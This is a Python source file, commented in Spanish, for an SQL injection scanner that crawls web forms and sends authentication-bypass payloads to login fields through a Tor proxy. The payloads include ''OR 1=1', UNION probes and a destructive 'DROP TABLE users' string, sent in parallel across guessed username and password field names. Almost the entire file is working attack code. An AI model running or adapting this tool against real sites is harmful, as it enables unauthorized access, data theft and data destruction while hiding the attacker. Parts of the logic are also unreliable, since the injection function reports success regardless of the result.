import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


class AdvancedSqlInjectionScanner:
    def __init__(self, proxy_address="127.0.0.1", proxy_port=9050):
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }

    def get_forms(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            forms = soup.find_all("form")
            for form in forms:
                # Encontrar todos los elementos de entrada (input) dentro de cada formulario
                inputs = form.find_all('input')

                # Iterar sobre los inputs e imprimir los nombres
                for input_tag in inputs:
                    nombre = input_tag.get('name')
                    if nombre:
                        print("Nombre del input:", nombre)
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {url}: {e}")
            return []

    def form_details(self, form):
        details_of_form = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        details_of_form['action'] = action
        details_of_form['method'] = method
        details_of_form['inputs'] = inputs
        return details_of_form

    def vulnerable(self, response):
        # Lista de posibles mensajes de error o éxito relacionados con SQL
        sql_related_messages = [
            # Mensajes en inglés
            "login successful!",
            "welcome",
            "access granted",
            "authentication successful",
            "you are in",
            "login confirmed",
            "successfully logged in",
            "session created successfully",
            "login successful. welcome!",
            "logged in. welcome back!",
            "login successful. enjoy your stay!",
            "access granted. proceed!",
            "authentication successful. welcome!",
            
            # Mensajes en español
            "inicio de sesión exitoso",
            "bienvenido",
            "inicio de sesión exitoso!",
            "acceso concedido",
            "autenticación exitosa",
            "estás adentro",
            "confirmación de inicio de sesión",
            "sesión iniciada con éxito",
            "sesión creada exitosamente",
            "inicio de sesión exitoso. ¡Bienvenido!",
            "logueado exitosamente. ¡Bienvenido de nuevo!",
            "inicio de sesión exitoso. ¡Disfruta tu estancia!",
            "acceso concedido. ¡Procede!",
            "autenticación exitosa. ¡Bienvenido!"
        ]

        # Verifica si alguno de los mensajes está presente en la respuesta
        for message in sql_related_messages:
            if message in response.content.decode().lower():
                return True
        return False


    def inject_sql(self, url, action, method, headers):
        # Obtén la URL actual antes de la inyección
        current_url = self.session.get(url).url

        # Modificar la consulta SQL aquí
        sql_payloads = [
            "' OR 1=1 -- ",
            "' OR 'a'='a",
            '" OR "a"="a',
            "') OR ('a'='a",
            '" OR "a"="a" -- ',
            "') OR ('a'='a",
            "'; DROP TABLE users; --",
            "'; SELECT * FROM users; --",
            "UNION SELECT 1,2,3 --",
            "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
            "ORDER BY 1--",
        ]

        username_payloads = [
            "uname",
            "username",
            "user",
            "usr",
            "name",
            "usernam"
        ]

        password_payloads = [
            "psw",
            "password",
            "pass",
            "pwd",
        ]

        def send_request(username_payload, password_payload, sql_payload):
            payload = {username_payload: sql_payload, password_payload: '1234'}

            if method == "post":
                res = self.session.post(urljoin(url, action), data=payload,
                                        headers=headers, proxies=self.proxies, allow_redirects=True)
            elif method == "get":
                res = self.session.get(urljoin(url, action), params=payload,
                                    headers=headers, proxies=self.proxies, allow_redirects=True)

            # Imprime la URL y datos de la solicitud para depurar
            #print(f"[+] Solicitud de inyección SQL ({url}):")
            #print(f"Payload enviado: {payload}")

            res.raise_for_status()
            #print("#####################" + str(res.text) + " for " + str(url))
            #print(f"Contenido de la respuesta: {res.content.decode()}")

            # Verifica si hay una vulnerabilidad
            if self.vulnerable(res) and res.url != current_url:
                print(f'Posible vulnerabilidad SQL detectada con payload: {payload}')

                # Obtiene la nueva URL después de la inyección
                new_url = res.url
                
                # Compara las URLs para verificar el redireccionamiento
                if current_url != new_url:
                    print(f'La página se ha redirigido a: {new_url}')
                    exit()
                    # Puedes manejar el redireccionamiento aquí
                return res  # Devuelve la respuesta

            #print(f'La consulta SQL con payload {payload} no tuvo éxito.')

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for username_payload in username_payloads:
                for password_payload in password_payloads:
                    for sql_payload in sql_payloads:
                        futures.append(executor.submit(send_request, username_payload, password_payload, sql_payload))

            for future in as_completed(futures):
                res = future.result()
                # Aquí puedes manejar la respuesta de cada solicitud

        # Si no se encontró ninguna vulnerabilidad
        #print(f'La inyección SQL no tuvo éxito con los payloads proporcionados.')
        return True


    def sql_injection_scan(self, urls):
        # Itera sobre las URLs obtenidas por el Crawler
        for url in urls:
            try:
                # Conecta a través de Tor
                self.session.proxies = {
                    'http': 'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'
                }

                # Obtén formularios y detalles
                forms = self.get_forms(url)
                print(f"[+] Detectados {len(forms)} formularios en {url}.")

                # Itera sobre los formularios
                for form in forms:
                    details = self.form_details(form)

                    # Si la acción del formulario contiene ".php"
                    if ".php" in url or ".php" in details["action"]:
                        # Llama a la función inject_sql
                        if self.inject_sql(url, details["action"], details["method"], {'User-Agent': 'pentest'}):
                            # Si encuentra una inyección SQL exitosa, termina el escaneo para esta URL
                            break

                
            except Exception as e:
                print(f"Error durante el escaneo de inyección SQL para {url}: {e}")

    
